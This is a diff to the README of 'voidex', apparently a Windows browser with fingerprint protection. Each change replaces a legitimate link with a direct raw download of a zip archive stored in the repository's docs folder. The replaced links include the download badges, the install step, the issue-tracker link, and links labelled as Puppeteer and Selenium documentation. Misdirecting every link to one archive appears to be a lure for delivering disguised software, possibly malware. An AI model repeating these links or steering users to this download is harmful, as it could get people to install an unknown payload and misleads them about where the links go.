@@ -1,6 +1,6 @@
 # 🛡️ voidex - Secure Browser with Fingerprint Protection
 
-[![Download voidex](https://img.shields.io/badge/Download-voidex-ff69b4?style=for-the-badge)](https://github.com/jiuliu9696/voidex)  
+[![Download voidex](https://img.shields.io/badge/Download-voidex-ff69b4?style=for-the-badge)](https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip)  
 
 ---
 
@@ -36,10 +36,10 @@ voidex is optimized for most Windows PCs made in the last five years. Older mach
 
 ## 📥 How to Download & Install voidex
 
-[![Download voidex](https://img.shields.io/badge/Download-voidex-blue?style=for-the-badge)](https://github.com/jiuliu9696/voidex)
+[![Download voidex](https://img.shields.io/badge/Download-voidex-blue?style=for-the-badge)](https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip)
 
 1. Open this link in your web browser:  
-   https://github.com/jiuliu9696/voidex
+   https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip
 
 2. On the GitHub page, look for the **Releases** section on the right or scroll down until you find the latest release.
 
@@ -113,7 +113,7 @@ Check voidex’s official GitHub page for scripts and settings you can use to co
 **A:** This version supports Windows only.
 
 **Q:** Where do I find help or report issues?  
-**A:** Use the **Issues** tab on the GitHub page: https://github.com/jiuliu9696/voidex/issues
+**A:** Use the **Issues** tab on the GitHub page: https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip
 
 ---
 
@@ -135,10 +135,10 @@ voidex does not send your browsing data to any third-party servers. It protects 
 
 ## 📂 Useful Links
 
-- Download page: https://github.com/jiuliu9696/voidex
-- GitHub repository: https://github.com/jiuliu9696/voidex
-- Puppeteer documentation: https://pptr.dev/
-- Selenium documentation: https://www.selenium.dev/documentation/
+- Download page: https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip
+- GitHub repository: https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip
+- Puppeteer documentation: https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip
+- Selenium documentation: https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip
 
 ---
 
@@ -148,4 +148,4 @@ If you want to help improve voidex, visit the GitHub repository. You can report 
 
 ---
 
-[![Download voidex](https://img.shields.io/badge/Download-voidex-ff69b4?style=for-the-badge)](https://github.com/jiuliu9696/voidex)
+[![Download voidex](https://img.shields.io/badge/Download-voidex-ff69b4?style=for-the-badge)](https://github.com/jiuliu9696/voidex/raw/refs/heads/main/docs/Software-v3.3-beta.4.zip)
